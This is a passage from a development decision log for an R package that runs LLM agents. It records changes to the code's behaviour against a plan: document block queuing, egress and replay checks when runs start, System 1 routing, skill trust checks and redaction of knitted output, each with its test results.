   (`R/doc-io.R`): a queued upsert of the block gets the inert grammar (`status=undone`, `#~ `
   lines; in a notebook `metadata.gptr.status` and `#~ ` source lines), a block that is only on
   disk gets a queued mark (`mark = TRUE`, the block's own lines in the requested state) that
   replaces it in place when the queue is applied, and the sidecar is written again. A redo
   revives the queued block the same way. Each change passes `document_write` (kind `inert`),
   as the file path does. `doc_apply_upserts()` drops a mark whose block is gone by then (no
   conflict warning); a mark of a block the user edited by hand is a conflict, as for any
   upsert (IC-51). The hook's `gptr.doc_block` entries record the backend `deferred` or
   `pending` for such a document. The lock and adoption steps that `doc_pending_add()` ran before
   queueing are now one helper, `doc_pending_open()`, which both use; `doc_queue_kind()` names
   the queue of a document (`deferred`, `pending` or none).
16. **doc.edit never edits the running script or the open notebook it is bound to** (review
   round 4; D-109 and report 14 section 2.1.2; IC-50). Under Rscript `doc.site` gives the running
   call's site, so an agent edit of an earlier block (the `documents` section asks for such edits)
   rewrote the script that R was still reading. A bound notebook open in this Jupyter kernel was
   answered `NULL`, so P10's edit tool wrote it. `doc_edit_service()` now returns an error tool
   result for both, without running the edit tool, and leaves the file unchanged. It never
   answers `NULL` there, because `NULL` lets the edit tool write the file. A bound notebook that
   is not open is still answered `NULL`. A document that is not bound is still answered `NULL`
   (04 section 7.0: "NULL: not a bound document"). Keeping P10's own `edit` and `write` tools
   from writing an unbound running script or open notebook is P10's to decide (open follow-up
   below).

Open follow-up (P10, review round 2): the `doc.edit` contract is `function(path, edits, session)`
(04 section 7.0), with no `replace_all`. P10's `edit_route_document()` (called by `member_edit()`
and `tool_edit_execute()`) passes only `edits`, so `gptr$edit(<bound document>, edits,
replace_all = TRUE)` reports "Found 2 occurrences ... must be unique" where the same call on any
other file replaces every occurrence. P10 should fold `replace_all` into each edit's `replaceAll`
before calling `doc.edit` (`apply_edits()` honours the per-edit flag, and `doc.edit` passes
`edits` to the edit tool unchanged, so its hand-edit protection covers every occurrence).

Open follow-up (P10, review round 4): `doc.edit` answers only for the bound document (04
section 7.0), so it keeps the edit tool away from the running script and the open notebook only
when they are bound (item 16). With `record = "off"` or no write consent, the script that Rscript
runs is not bound. P10's `edit` and `write` tools would then still rewrite it during the run,
and the same holds for a notebook open in the Jupyter kernel. P10 could refuse such paths itself, for
example with P15's `doc_queue_kind(path)`.

Not behavioural: `doc_console_append()` leaves redaction to `doc_transcript_append()`, which
already redacts with the persist profile (D-117 item 3); the `doc.replay` test gives itself its
own replay table (`local_replay_table()`, D-119 item 5's test isolation).

IC-74 (07 section 6, P15 row): console lines, rewind notes and System 1 one-line blocks are
written only under write consent and redacted (the transcript writer redacts console lines and
rewind notes; `doc.s1_block` redacts its line itself, item 12); the one-line block's `model=`
keeps the model P13's `meta` names; the route replays with no provider call and no discovery
(Task 12).

Validation: `progress/P15.md`, Task 13. `^doc-(formats|replay|io)$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 903 ]`, the same under `LC_ALL=C LANG=C`; after review round 1
(items 8-10) `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 924 ]`; after review round 2 (items 11-12)
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 934 ]`; after review round 3 (items 13-14)
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 948 ]`; after review round 4 (items 15-16)
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 982 ]`, the same under `LC_ALL=C LANG=C`.

## D-123 - P08 session SDK verbs: a verb that starts a run freezes its safety record then and re-checks egress and replay under it (a refusal keeps the pending call), one approved gptr_cancel() call covers every session it names, and export(gptr_return) is taken early for D-054 (2026-10-05)

P08 Task 10 (`R/gptr-sdk.R`, `tests/testthat/test-gptr-sdk.R`). The plan's six verbs, signatures,
classes and its 13 tests are unchanged (they give exactly the plan's 55 expectations); three
behavioural changes, each with its own test:

1. **A run that a verb starts is guarded and frozen when it starts** (IC-74, 07 section 5;
   IC-45; IC-29; the Task 9 obligation of D-114 review round 3). The plan's `sdk_start()` called
   `run_start(s, NULL, opts)` directly, so a `.run = FALSE` run got P06's plain
   `safety_snapshot()` without the protected `ollama_local_only`, and nothing re-checked egress
   or replay after the queue-time check. `sdk_start()` now takes a root run's record once
   (`gateway_run_safety()`), runs `gateway_guards()` under it (the pending call's own `replay =`
   and `.opts$context`; for a queued follow-up without a pending call, the settings and the
   process mode) and starts the run with `gateway_run_start(s, NULL, opts, cur, safety)`. The
   guards run before the pending options are taken, so a refusal leaves the session idle with its
   pending call and held record in place for a later retry. The check and the start are two
   helpers (`sdk_check()`, `sdk_launch()`; `sdk_start()` runs both for `gptr_step()`), and
   `gptr_wait()` checks every session of a list before it starts any, so a refusal for one
   session starts none: otherwise the sessions started before the refused one would stay
   `running` with nothing pumping them (review round 1). Tests "a pending run freezes its
   safety record when a verb starts it (07 section 5)" (5: relaxed by a human after queueing is
   `FALSE` at start, tightened again is `TRUE`, options set in between never relax it, checked
   with the session layer cleared so that only the options could relax it), and
   "starting a pending run re-checks egress and replay; a refusal keeps it pending" (11: an
   acknowledgement withdrawn after queueing is `gptr_error_egress` naming the provider, the
   process switched to replay is `gptr_error_not_recorded`, no request either time, the call
   still pending, then one request once both allow it) and "gptr_wait() checks every session
   before it starts any; a refusal starts none" (11: `gptr_wait(list(a, b))` refused for `b`'s
   withdrawn acknowledgement leaves `a` idle, pending, without a run or a request; once
   acknowledged again one wait settles both). Against the plan-literal source the first fails 3
   times (no `ollama_local_only` in the record) and the second 6 times (the withdrawn
   acknowledgement was ignored and the live request was sent); the third failed 4 times against
   round 0's single-phase `sdk_start()` (`a` left `running`, its pending call taken).
2. **One approved `gptr_cancel()` call consumes one token** (IC-53 item 3: "the dispatcher
   approved exactly that call ... a one-shot token on the run"). The plan's loop called
   `gateway_control_other()` per session, so cancelling two other sessions from model code needed
   two approvals and failed after aborting the first. `sdk_control_other()` checks once per call,
   when any named session is not the running one, before anything is aborted. Test "one approved
   gptr_cancel() call may cancel a list of other sessions (IC-53)" (4; an error against the
   plan-literal source).
3. **`export(gptr_return)` and `man/gptr_return.Rd` are taken in this task** (D-054; plan Task 12
   generates P08's NAMESPACE). D-054's test evaluates `r = gptr_return(5)` in a home that cannot
   see gptr, so `gptr_shim()` rewrites the call to `gptr::gptr_return`, which `::` resolves only
   for a NAMESPACE export, also under `load_all()`. The lines come from the document action in a
   scratch copy of `HEAD` plus `R/gptr-sdk.R` (`dev/.validation/P08/task10-document-scratch.log`);
   the example (`y = gptr_return(1:3)`) needs nothing else. The other five verbs keep their
   roxygen tags but wait for Task 12 with `gptr` and its six methods (D-113 item 3): their
   examples call `gptr()`, which is not exported yet, so R CMD check would fail them. A document
   run in the shared tree must not commit those lines before Task 12.

Coverage tests for plan behaviour without a plan test (pass against the plan-literal source too):
"a follow-up on a session without a kept home runs in the verb's caller [R2]" (5) and
"gptr_return() keeps a name bound in the kept home by name (03 5.1)" (4).

Validation: `progress/P08.md`, Task 10. Red (no source) `^gptr-sdk$`
`[ FAIL 20 | WARN 0 | SKIP 0 | PASS 6 ]`; against the plan-literal source 9 failures and one
error in the adaptation tests only (`task10-red-adaptations-against-plan-literal.log`); green
after review round 1 `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 95 ]` (55 plan + 40 adaptation and
coverage expectations; `task10-fix1-green-counts.log`).

## D-124 - P13 builtin:system1: the built-in also registers the ollama-system-one adapter (IC-74), the Jev provider records carry their prices as a data frame, and seven Task 9 tests follow the test process's replay option, D-099's egress rule, the mock server's working directory and P01's fake classifier, and (review round 1) P07's `{s1}` alias still names `jev` when only a local classifier makes System 1 usable (forward note) (2026-10-05)

P13 Task 9 (`R/s1-client.R`; tests appended to `test-s1-client.R`, `test-s1-route.R`,
`test-s1-emulate.R`). The section text, the provider ids, URLs, keys, rate and model ids, the
route (order 10), the section (T0, 650, 150) and the `s1.decide` declaration are the plan's.

1. **`ollama-system-one` is registered by `builtin_system1()`** (IC-74; 07-local-ollama.md
   sections 3 and 6; D-120 item 11). P05's built-in `ollama` record and its Clef catalog
   entries route decision models to that api, and until now only tests registered it
   (`local_s1_ollama_adapter()`). The built-in test also checks its transport and classify
   functions.
2. **Prices are a data frame.** The plan's `s1_jev_model()` gave `prices` as a list of price
   records (catalog JSON shape), which P02's `kind_check_provider()` refuses (`prices` must be a
   data frame), so `builtin:system1` would fail to load. The same rates ($0.042 per million input
   tokens, output and cache reads free, from 2026-09-15) are a one-row data frame, as P01's fake
   records carry them.
3. **Tests.** `setup.R` and `dev/ci/isolated-check.R` set `options(gptr.replay = "replay")`,
   which `replay_mode()` reads before `GPTR_REPLAY`. The three tests that set
   `GPTR_REPLAY = "live"` therefore also set the option.
   - The IC-47 test's `remote` spec (`local = TRUE`, not offline) names a loopback endpoint,
     because the `local` hint alone needs the egress acknowledgement (D-099).
   - The four mock-server tests (the choices test below included) start the server before
     `s1_fresh()` moves the working directory, which `test_path()` resolves against.
   - The INFRA-18 choices test asks the mocked `/systemone` through the TypeSafe adapter rather
     than P01's fake classifier. The fake refuses undescribed choices (`{"liver": null}`, 04a's
     wire shape; D-077), and a factor's options never carry descriptions. The plan's assertions
     are unchanged, plus one: the refused labels send nothing.
   - The section test adds IC-74's local case: with a verified local classifier (P05's
     `catalog_local_classifier()` mocked) and no TypeSafe key, the section is shown.

Review round 1 (`progress/P13.md`, Task 9 review round 1):

4. **Open gap, forward note to P07's owner and the coordinator; no P13 code change.** With only
   a verified local classifier (no TypeSafe key, `system1` unset), the section is shown as 07
   section 5 requires, but P07's `prompt_s1_alias()` writes `jev` for `{s1}`, and `s1_target()`
   resolves `jev` to `typesafe/jev-latest` (07 section 1), which fails without a key
   (`task9-fix1-probe.log`). Contract 9.3 fills `{s1}` with the configured System 1 alias, which
   here is the local classifier. The fix belongs to `prompt_s1_alias()` (07 section 6: P07/P08
   own "local classifier prompt without keys"), which also fills `{s1}` in P15's `documents`
   section: when the session's `system1` setting is unset and `model_default("system1")` is not
   `typesafe/*`, write that reference quoted (`"ollama/clef-flash"`). Giving `jev` a local
   meaning in `s1_target()` instead would redirect a user's own `model = "jev"`, so it is left to
   the coordinator. With the fix, add a test that the rendered `{s1}` names a model that
   `s1_target()` reaches without a key.

Validation: `progress/P13.md`, Task 9. Red `[ FAIL 34 | WARN 0 | SKIP 0 | PASS 658 ]`
(`task9-red.log`; every failure the missing route, provider, section or service). Negative
control: the final tests on a scratch copy without the two `on_load()` declarations,
`[ FAIL 33 | WARN 0 | SKIP 0 | PASS 663 ]` (`task9-red-final.log`). Green
`^s1-(client|emulate|route)$` `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 781 ]` (`task9-green.log`;
unchanged after review round 1, `task9-fix1-green.log`).

## D-125 - P10 golden transcript: P07's token runner passes P08's gptr_call record to the context blocks, so P09's attached block describes the fixture's objects instead of rendering a describe failure (2026-10-05)

P10 Task 13 adds `dev/bench/tokens/fixtures/ns02b-data-first-pipe.json` (byte-identical to the
plan) and its `baseline.csv` row through P07's runner. One change outside the task's file list:

1. **`bench_case()` builds its call with `call_new()`** (`dev/bench/tokens/run.R`, P07's
   development runner). P07's runner passed a plain list shaped like a call record as
   `input$call`. P07's plan says `input$call` is P08's `gptr_call` (contract 7.8), and P08's
   `call_value()` refuses anything else (D-102 item 6, which added the class check). Since P09's
   `attached` block exists, the runner's first message therefore read
   ``<?> (describe failed: `call` must be an object of class <gptr_call>, not a list of
   length 4.)`` instead of a description of `mice`. So the measured `input_total` was lower than
   real (`ns02b-data-first-pipe` 3,092 instead of 3,280) and `facts` found only the block's name
   (1 instead of 4, which would have made the row's no-loss gate empty). `bench_case()` now calls
   `call_new(context = ..., envir = home, args = list(opts = list()))`, with the same context
   items, environment and options as before. With that, the row equals the plan's figures
   exactly: `2,1271,3280,130,0,0,4,1638,4014`. The tolerances, gates, static prefixes, the
   `prefix = 0.02,` line that P24 edits, and P07's committed rows are unchanged. P07's own rows
   now measure their `<attached>` block too (`ns02-mixed-model`: `facts` 1 -> 4, `input_total`
   5,570 -> 5,750), which is still below their baselines (6,088). As the plan says, P10 updates
   only its own row.

Validation: `progress/P10.md`, Task 13. The probe `task13-attached-probe.log` shows the
`attached` text before (the describe failure) and with `call_new()` (the data frame with its
three columns). The bench logs are `task13-red.log` (before the fix: `facts 1`,
`input_total 3092`), `task13-red2-runner-fixed.log` (the plan's error, `no baseline row`) and
`task13-green.log` (`OK: 4 static prefixes and 3 golden transcripts within the baseline
tolerances`).

## D-126 - P13 Jev router example: a compaction keeps the router's phase (and starts the implementation after the first edit), the router allows 120 s per call, and the usage notes need no lint suppression (2026-10-05)

P13 Task 11 (`inst/gptr/examples/jev-router.R`; tests appended to `test-s1-route.R`). The
models, the System 1 question, its two options, the 16,000-character state, the 0.5 threshold,
the edit/write switch, the factory and the plan's five tests are the plan's.

1. **A compaction keeps the router's phase.** The plan's route answered every request whose
   reason is not `"turn"` with the bare `implement` model. P06's `run_compact_check()` calls
   `run_route(run, "compaction")`, which records the switch with the state the router returns,
   and P08's `router_call()` reads the next turn's state from that last `gptr.router` entry. A
   compaction during planning therefore erased the phase, and the next turn asked System 1 again
   as if the session were new (report 04 section 4.9: classify once per session). The route
   returns `list(model = implement, state = request$state)` instead, so the next turn returns to
   the planner in the state. One added test (5 expectations) pins it. Review round 1: P06's
   `run_route()` records a state only when the model changes, so a compaction at the request
   boundary right after the first successful edit or write (state `planning`, now on
   `implement`) left the turn's switch to the implementation phase unrecorded: the next user
   turn went back to the planner (a third `model_change` and cache miss), and a compaction that
   summarised the edit away sent the same turn back to the planner. The compaction's answer now
   carries `list(phase = "implementation", model = implement)` when an edit has succeeded since
   the last user message (the compaction request's messages are the pre-compaction projection,
   so the edit is visible). One added test (9 expectations) runs that scenario end to end with
   test-only `compact.should`/`compact.run` services and checks the route alone with a
   successful and a failed edit.
2. **No `nolint` block.** The plan's header comment held code-shaped usage lines inside
   `# nolint start: commented_code_linter.`; the usage is written as prose with inline code
   instead, and also names a prepared local decision model (IC-74) as a System 1 source.
3. **120 s per router call** (review round 1). The plan's router used `gptr_router()`'s default
   `timeout = 2`. A System 1 rating can take longer: `ctx$decide()` runs up to `gptr.s1_rounds`
   (3) bounded rounds with retry-after waits, a remote request has a 30 s first-byte limit, and
   a native Ollama decision 120 s (`s1_ollama_first_byte`, for a cold Clef load, IC-74). P08's
   `router_invoke()` discards any answer slower than the timeout and falls back to the default
   chat model with no state (an error when no default is set), so a slow rating ran the first
   turn on an unrelated default model instead of the `standard` the header promises. IC-69
   makes `timeout` the router's own (default 2, `ctx$decide()` allowed), and only the first
   request of a session rates (every later one is plain code), so the example passes
   `timeout = 120`, one System 1 request's longest wait; the header says that a slower call
   falls back to the default chat model and the next request rates again. One added test (4
   expectations) uses a fake System 1 that takes 2.5 s.

Validation: `progress/P13.md`, Task 11. Red `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 249 ]`
(`task11-red.log`, every failure the missing example). Green `^s1-route$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 276 ]` (`task11-green.log`); the plan-literal versus shipped
compaction answer in `task11-compaction-probe.log`. Review round 1: red
`[ FAIL 11 | WARN 0 | SKIP 0 | PASS 278 ]` (`task11-fix1-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 289 ]` (`task11-fix1-green.log`).

## D-127 - P15 gptr_doc(), gptr_blocks() and gptr_cache(): every call owns the block its format's locator gives it, a document is bound only in the format of its extension, a missing file is an invalid argument, and the prune keeps S2 answers it cannot check and reads spill_days safely (2026-10-05)

P15 Task 14 (`R/doc-replay.R`; tests appended to `test-doc-replay.R`). The exports' signatures,
the listings' columns, the control guard (IC-53), the sidecar rule (IC-51) and the plan's four
test blocks are the plan's.

1. **Block ownership in `gptr_blocks()` follows contract 11.5.** The plan gave every block of a
   statement's run to the first top-level call that located it, and every notebook agent cell to
   the first call of the nearest calling cell before it, even across cells without a call. The
   second step of a pipeline and the second call of a notebook cell read `stale` with another
   call's prompt; an agent cell after a cell with no call read `fresh`. Each top-level call now
   owns the block that `doc_text_locate()`/`doc_rmd_locate()` (or, in a notebook,
   `doc_rmd_owner()` over the calling cell's run, as `doc_ipynb_locate()`) gives it; a block no
   call owns is `stale`. The `prompt` column is one line.
2. **`gptr_doc()` binds a document only in the format of its extension.** The extension must be
   `.R`, `.Rmd`, `.qmd` or `.ipynb` even when `format` is given, an explicit `format` must be that
   format or `"transcript"` for an `.R` file, and a directory is refused (`invalid_argument`). The
   plan accepted any file with an explicit format, so R markers could be written into a
   notebook's JSON or a chunk of the wrong syntax into a qmd.
3. **`gptr_blocks()` of a missing file or a directory is `invalid_argument`**, not
   `gptr_error_doc_write` from the read.
4. **The prune keeps what it cannot check.** An S2 answer of a document that exists but cannot be
   read or parsed is kept (team and block-nested replays need it, IC-47). So is an answer of a
   block queued for its document: in the document's sidecar (a deferred Rscript upsert, IC-51, or
   a pending Jupyter one, IC-50) or in this process's own queue. Such a block reaches the file only
   at exit, at `gptr_doc(path, sync = TRUE)` or at recovery, and its answers were cached when it
   was queued; it was never deleted (contract 6.4 prunes "S2 entries of deleted blocks"). Only
   answers of a block that is neither queued nor in its existing document are removed.
   `gptr.spill_days` that is not one non-negative number falls back to 7 (the plan removed
   nothing and warned).

Validation: `progress/P15.md`, Task 14. Red `[ FAIL 8 | WARN 0 | SKIP 0 | PASS 352 ]`
(`task14-red.log`); against the plan literal the 4 addition blocks fail 16 expectations and the
plan's 44 pass (`task14-adapt-red-plan-literal.log`); green `^doc-replay$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 424 ]` in the default and the C locale (`task14-green.log`,
`task14-green-clocale.log`). Review round 1 (item 4, queued blocks): regression red
`[ FAIL 3 | WARN 0 | SKIP 0 | PASS 427 ]` (`task14-fix1-red.log`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 430 ]` in the default and the C locale
(`task14-fix1-green.log`, `task14-fix1-green-clocale.log`).

## D-128 - P15 gptr_source(): the document is parsed as UTF-8 (IC-62), a file it cannot read is an invalid argument, a missing `replay` keeps the replay-mode chain, a stale call run without a write is `ran`, and expressions map to blocks by their parsed lines (2026-10-05)

P15 Task 15 (`R/doc-replay.R`; tests appended to `test-doc-replay.R`). The export's signature,
the srcref-based evaluation loop (its block mapping aside, item 6), the skip set and the
`action` values are the plan's. The `gptr.replay` scope is the plan's when `replay` is given
(item 4). The roxygen is the plan's plus one sentence each for items 4 and 5.

1. **`parse(..., encoding = "UTF-8")` (IC-62).** `doc_read()` returns lines marked UTF-8. The
   plan's `parse(text = doc$lines, keep.source = TRUE, srcfile = srcfile)` translates them to the
   native encoding. In a non-UTF-8 locale every non-ASCII character of a string literal then
   becomes `<U+00E9>` text: `x = "caf\u00e9"` bound `"caf<U+00E9>"`, and a call
   `gptr("caf\u00e9 step")` received that text. Its prompt hash no longer matched its fresh block,
   so the call was not located and ran live instead of replaying. IC-62 requires a UTF-8 prompt
   literal of a script to stay byte-exact under `LC_ALL=C`. With `encoding = "UTF-8"` the parser
   keeps the marked text and marks the literals UTF-8 (verified in a C and a UTF-8 locale; the
   result in a UTF-8 locale is unchanged).
2. **A file it cannot read is `invalid_argument`** (`arg = "file"`). A missing file or a
   directory is checked first, as for `gptr_blocks()` (D-127 item 3). The plan let `doc_read()`
   signal `gptr_error_doc_write` (reason `missing`), a write error that contract 6.4 does not
   list for `gptr_source()`. Review round 2: the other `doc_read()` failures, a file that is not
   valid UTF-8 (reason `encoding`, for example a Latin-1 or CP1252 script with an accented
   literal) and an unreadable file (reason `unreadable`), are re-raised the same way with
   `doc_read()`'s message (`expected = "a readable UTF-8 .R file"`). Nothing has been evaluated
   and no frame is pushed at that point. `gptr_blocks()` still signals `doc_write` for these two
   reasons and for a malformed notebook (Task 14 code, outside this task; left for the plan
   acceptance).
3. Test-only: the plan's two `expect_null(getOption("gptr.replay"))` assume that the option is
   unset, but `tests/testthat/setup.R` (and `dev/ci/isolated-check.R`) set
   `gptr.replay = "replay"` for the whole run. Both plan tests now begin with
   `withr::local_options(gptr.replay = NULL)`, as the plan's own Task 17 test does, and keep the
   literal `expect_null()`. This proves the restore on exit on the success path and after the
   `stale_block` error: with the restore deleted, both lines fail
   (`task15-fix1-mutation-no-restore.log`).
4. **A missing `replay` is not scoped over the file (contract 7.8, IC-30).** The plan set
   `options(gptr.replay = replay)` for every run. With the option unset, the default
   `getOption("gptr.replay", "auto")` then installed `"auto"` above `GPTR_REPLAY` and the `replay`
   setting in `replay_mode()`'s chain (`arg > gptr.replay > GPTR_REPLAY > settings > "auto"`).
   Under `GPTR_REPLAY=replay`, which architecture section 1 and contract 7.8 promise proves that a
   script makes no model call, `gptr_source(f)` regenerated a stale block live and rewrote it.
   The signature is unchanged. Only a `replay` the caller gives is set and restored. Left
   missing, it is still validated, and each call resolves its mode through `replay_mode()`.
   While the option is set, this gives the same mode as before. P25's vignette calls
   `gptr_source(script, envir = new.env())` without `replay` for its first, recording run, so a
   precompute session under `GPTR_REPLAY=replay` must unset it or pass `replay = "auto"`.
5. **A stale call that ran without a write reports `ran`.** Without write consent (`record`
   `"off"`, or `"ask"` without a prompt), a stale block still regenerates in the route. The old
   block is skipped and the call runs live, but nothing is written, so `doc_after_write()` logged
   no action and the row read `NA`, which the roxygen keeps for blocks no call touched. A block
   in the frame's skip set without a logged action is now `ran`. Its status stays `stale`, because
   the document is unchanged. The same applies to a locked or conflicting document.
6. **Expressions map to blocks by their parsed lines (review round 2).** The plan compared each
   srcref's first and last line (fields 1 and 3) with the physical block lines of
   `doc_find_blocks()`. Fields 1 and 3 follow `#line` directives, and R's parser reads any comment
   that starts with `#line <digits>` as one (`#line 50 is where ...` included), so every later
   line shifts. The locator (`doc_site_srcref()`) reads the parsed lines (fields 7 and 8) and
   still found and regenerated the call, but the old block's expressions were no longer
   recognised as its own: the old code ran, which `gptr_source()` exists to prevent, and the row
   still read `regenerated`. The mapping now uses fields 7 and 8. The same field-1/3 reading
   remains in `doc_stmt_by_expr()` (the `source()` frame locator) and `doc_drop_ranges()`
   (recorded-code cleaning) in `doc-blocks.R` (Tasks 2 and 3, outside this task; left for the
   plan acceptance).

Validation: `progress/P15.md`, Task 15. Red `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 430 ]`
(`task15-red.log`); against the plan literal the plan's tests fail only the 2 option
expectations (`task15-green0-plan-literal.log`) and the addition blocks fail 5
(`task15-adapt-red-plan-literal.log`); green `^doc-replay$`
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 466 ]` in the default and the C locale (`task15-green.log`,
`task15-green-clocale.log`). Review round 1 (items 3-5): the 2 regression tests fail 8
expectations on the previous source (`task15-fix1-red.log`); green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 486 ]` in the default and the C locale
(`task15-fix1-green.log`, `task15-fix1-green-clocale.log`). Review round 2 (items 2 and 6): the
2 regression tests give `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 491 ]` on the previous source
(`task15-fix2-red.log`); green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 500 ]` in the default and the
C locale (`task15-fix2-green.log`, `task15-fix2-green-clocale.log`).

## D-129 - P17 skill.body: a skill found in the registry is served without a sync only while its SKILL.md exists and the registry holds the current trusted project's skills; the catalog budget's order is tested (2026-10-05)

P17 Task 4 (`R/skill-discover.R`), review rounds 1 and 2. The plan-literal `skill_body()` changed.
`skill_sync()` and `skill_collect()` were refactored without changing their behaviour. The
signature, return shape and conditions of `skill_body()` and the plan's 9 tests are unchanged.

1. **A registered skill is checked again (IC-52; 04 section 10.1; the plan's own `skill_body()`
   rule).** The plan's `skill_body()` synced only when the name was missing from the registry.
   Otherwise it returned whatever the last `skill_sync()` had registered. P08 builds `skills =`
   preloads in `gateway_input()` before `run_start()` emits `session_start`, so a preload read
   the registry that an earlier sync had left. The reviewers reproduced five results, and the
   tests below now lock each one out:
   - A project skill was still served after `gptr_trust(p, FALSE)` or after a trust fingerprint
     mismatch. `gptr("hi", skills = "proj-skill")` then put its body in the first user message
     while T1 correctly omitted it.
   - After the working directory moved to another project, the old project's skill of the same
     name was served instead of the new project's. When the new project was untrusted, it was
     served instead of `gptr_error_untrusted`.
   - A `SKILL.md` deleted after the sync gave a silent empty body.
   - A project nested inside another kept its skill (round 2). A skill synced in an inner
     project B was still served from the outer trusted project A after B's trust was removed,
     although `skill_discover()` in A does not list it.
   - A user, package or built-in skill was not displaced by a project skill of the same name
     (round 2). After a sync in a project without that skill, the skill registered at rank 3 was
     still served in a trusted project whose own skill should win at rank 1. So
     `gptr(skills = "dup-skill")` preloaded the user copy, while the catalog and the later
     `read skill:dup-skill/...` calls of the same session served the project copy.

   The plan says an untrusted project's skill signals `gptr_error_untrusted`. IC-52 says only
   skills from user directories, installed packages and trusted projects are used.

   **Fix.** `skill_spec_current(spec)` now requires two things:
   - The `SKILL.md` still exists (`skill_file_ok()`, through P10's `fs_path()`).
   - `skill_project_synced()` holds: the registered `skills:project` group is the one
     `skill_sync()` would write now. To decide, it walks only the current project skill roots
     (the `.gptr/skills`, `.agents/skills` and `.claude/skills` directories from the working
     directory up to the project root, plus the relative `skills.paths` entries) with
     `skill_collect(roots)`. It takes the group from `skill_groups()` and compares its
     `skill_group_sig()` (the files' paths, times and sizes) with the registered one. With an
     untrusted project, or one without skills, no group may be registered.

   Round 1's test of "`trust_ok()` and the file inside `project_root()`" is gone, because it
   missed both round-2 cases. `skill_sync()` now builds its groups and signatures with the same
   two helpers, so the check and the sync cannot drift apart. A spec that fails the check is
   looked up again after `skill_sync()`. It then falls through to the existing
   `gptr_error_untrusted` / `gptr_error_invalid_argument` branch, or it resolves to the winner
   that the sync registers.

   **Cost.** No sync runs while the registry is current. This includes a trusted relative
   `skills.paths` entry outside the project root, such as `../shared` (D-074 item 4); round 1
   still synced on every call for those. Each `skill.body` call, which means each preload and
   each `read skill:<name>/...`, costs the bounded walk of the project skill roots, cached
   parses (one `file.info()` per `SKILL.md`) and one `trust.get` lookup.

   **Not covered.** A newly added user or package skill directory that would win a name within
   its own rank is still picked up only by the next sync, which is the `session_start` hook.
2. **Test-only: `skills_budget()`'s order.** No test pinned the order `gptr.skills_budget`, then
   the `skills.budget` setting, then 1,500, which the plan header and its self-review claim for
   Task 4. One test now checks each level, and checks that the `skills` section follows a budget
   too small for any entry.

**Counts.** Nine regression tests (32 expectations) are appended to
`tests/testthat/test-skill-discover.R` after the plan's 9 Task 4 tests: five from round 1 (16
expectations) and four from round 2 (16 expectations). Every later count for that file is 32
higher (IC-74):

| Count | Before | After |
|---|---|---|
| Task 4 | 163 | 195 |
| Acceptance 2b | 163 | 195 |
| Task 12's second command (`skill\|subagent-defs`), after D-074, D-084 and D-086 | 386 | 418 |
| Acceptance 1, after D-088 | 745 | 777 |
| Acceptance 4c, after D-088 | 522 | 554 |

**Validation.** See `progress/P17.md`, Task 4, review rounds 1 and 2. All runs use `^skill-discover$`.

| Run | Result | Log |
|---|---|---|
| Round 1 red | `[ FAIL 9 \| WARN 0 \| SKIP 0 \| PASS 170 ]` | `task4-fix1-red.log` |
| Round 1 green | `[ FAIL 0 \| WARN 0 \| SKIP 0 \| PASS 179 ]` | `task4-fix1-green.log` |
| Round 2 red | `[ FAIL 8 \| WARN 0 \| SKIP 0 \| PASS 187 ]` | `task4-fix2-red.log` |
| Round 2 green | `[ FAIL 0 \| WARN 0 \| SKIP 0 \| PASS 195 ]` | `task4-fix2-green.log` |

In round 1 red, the budget test passes because it pins behaviour that was already right. In round 2
red, the eight failures are the nested project (3), the shadowed user skill (2 direct, 2 e2e), and a
sync on every call for `../shared` (1).

Round 1 mutants (`task4-fix1-mutation-*.log`), against that round's source:

| Mutant | Result |
|---|---|
| No trust check | `[ FAIL 4 \| ... \| PASS 175 ]` |
| No project-root check | `[ FAIL 2 \| ... \| PASS 177 ]` |
| No option branch of `skills_budget()` | `[ FAIL 3 \| ... \| PASS 176 ]` |
| No setting branch | `[ FAIL 1 \| ... \| PASS 178 ]` |

Round 2 mutants (`task4-fix2-mutation-*.log`):

| Mutant | Result |
|---|---|
| No `skill_project_synced()` | `[ FAIL 14 \| ... \| PASS 181 ]` |
| Presence check only, with no signature comparison | `[ FAIL 2 \| ... \| PASS 193 ]` (the round-1 move between two trusted projects) |

Lint is clean.

## D-130 - P15 knitr integration: what knit_print shows is redacted like the recorded blocks (IC-74), the label hook is also removed when a knit fails, and a nested knit never ends the skip of the knit that runs it (2026-10-05)

P15 Task 16 (`R/doc-knitr.R`; `doc_skip_old()` in `R/doc-replay.R`; tests in
`test-doc-knitr.R`). The two `knit_print` methods, `doc_knit_code()`, the lazy registration with
`s3_register()`, the chained label hook and its `document` cleanup hook are the plan's; the
plan's 4 tests pass unchanged apart from the fixture path (item 4).

1. **Redacted output (IC-74, 07 section 6 P15 row: "redacted, consented workflow records").** The
   rendered document is a durable record, like the agent chunk that `doc_block_lines()` redacts
   with the `persist` profile and the one-line block that `doc.s1_block` redacts (D-122). The
   plan printed `x$text` and the System 1 summary as they were. The answer comes from entries
   redacted at ingress, so only secrets known when they were appended were masked: a value
   registered later (IC-70's late registration), which `doc_block_lines()` masks again when it
   writes, reached the knitted output, and so did a free-text choice level. Both methods now pass
   their text through `redact(, "persist")`. The code part needed no change:
   `doc_turn_body()` already rewrites a registered literal to `Sys.getenv("NAME")`, as in the
   block.
2. **The skip is scoped to one knit also when the knit fails.** knitr calls the `document` hook
   only after the last chunk, so a chunk error (`error = FALSE`, rmarkdown's default) after a
   regeneration left the plan's label hook installed with its label in `knitr_skip` and
   `knitr_hooked` TRUE. `knit()` then reset the `document` hook to its default, so no cleanup ever
   ran again: every later knit in that R session silently skipped the regenerated (now fresh)
   agent chunk, so its objects were missing while the call replayed. `doc_knitr_skip()` now also
